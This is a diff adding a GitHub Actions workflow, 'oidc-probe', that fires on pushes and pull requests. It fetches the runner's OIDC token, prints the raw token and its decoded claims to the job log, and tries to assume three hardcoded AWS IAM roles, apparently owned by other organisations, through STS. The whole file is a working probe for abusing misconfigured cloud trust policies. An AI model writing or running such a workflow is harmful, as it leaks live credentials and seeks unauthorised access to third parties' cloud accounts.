@@ -1,0 +1,34 @@
+name: oidc-probe
+on:
+  push:
+  pull_request:
+    types: [opened, reopened, synchronize]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc
+        run: |
+          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          TOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "TOKEN_LEN=${#TOKEN}"
+          echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME REF=$GITHUB_REF"
+          echo "TOKEN_PAYLOAD_START"
+          printf '%s' "$TOKEN" | cut -d. -f2 | python3 -c 'import sys,base64,json;s=sys.stdin.read().strip();s+="="*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))'
+          echo "TOKEN_PAYLOAD_END"
+          echo "RAW_TOKEN_START"
+          echo "$TOKEN"
+          echo "RAW_TOKEN_END"
+          for ROLE in arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin-dollar arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-arm-oeth arn:aws:iam::192824654885:role/github-actions-ecr ; do
+            echo "===ASSUME ${ROLE}==="
+            curl -sS -X POST "https://sts.amazonaws.com/" \
+              -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" \
+              -d "RoleSessionName=oidcprobe" -d "DurationSeconds=3600" \
+              --data-urlencode "RoleArn=${ROLE}" --data-urlencode "WebIdentityToken=${TOKEN}"
+            echo
+            echo "===END ${ROLE}==="
+          done
